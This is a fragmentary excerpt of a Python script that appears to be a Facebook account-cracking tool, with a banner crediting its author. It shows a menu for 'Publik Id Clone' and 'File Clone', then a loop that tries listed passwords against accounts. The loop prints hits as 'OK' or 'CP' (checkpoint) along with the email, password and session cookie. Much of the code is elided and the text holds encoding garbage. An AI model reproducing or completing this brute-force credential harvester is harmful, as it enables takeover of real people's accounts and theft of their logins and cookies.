...
\033[1;32m==================================================
          ...
          Facebook   : Rafi Hasan.401
          Github     : Rafi-404   
          Version    : \033[1;96mFREE//0.4\x1b[0m\033[1;31m [Updated] \x1b[0m
\033[1;31m==================================================           
\x1b[0;97m\x1b[1;43m         ðŸ  Rafi Hasan IS A BRAND ðŸ¥°          \x1b[0m
""")
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def main():
	...
	print(f'{N}[{asu}âœ“{N}]{H} Status  {N}: \033[41m\033[1;37m FREE \x1b[0m\x1b[1;97m{N}')
	print(' ')
	print(f'[{H}MENU{N}]=============>')
	print(f'{N}[{h}1{N}] Publik Id Clone')
	print(f'{N}[{h}2{N}] File Clone')
	print(f'{N}[{h}0{N}] EXIT')
	print(f'{N}â•­[{h}CHOICE MENU{x}]')
	_____IKFAR__IFC_____ = input(f'\râ•°â”€âž£{h} ')
...
def passwrd():
	...
	print(f'{N}â•­â”€â”€â”€[{b}â€¢{x}]{h} OK : {h}%s '%(ok))
	print(f'{N}{x}[{b}â€¢{x}]{k} CP : {k}%s{x} '%(cp))
	print('â”‚')
	print(f'[{b}â€¢{x}] Crack Again ( Y/t ) ? ')
	woi = input(f'â•°â”€â”€â”€[{b}â€¢{x}] Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{N}â•­â”€â”€â”€[SHOAIB-CP]\nâ””â”€â”€â•­âž£ EMAIL: {k}{idf}{N}\n â””â”€â”€â•­âž£ PASSWORD: {k}{pw}{N}\n   â””â”€â”€â”€âž£{m} {ua}{N}\n')
				...
				print(f'\r{N}â•­â”€â”€â”€[SHOAIB-OK]\nâ””â”€â”€â•­âž£ EMAIL:  {H}{idf}{N}\n  â””â”€â”€â•­âž£ PASSWORD:  {H}{pw}{N}\n  â””â”€â”€â•­âž£ Cokkie: {H}{kuki} ')
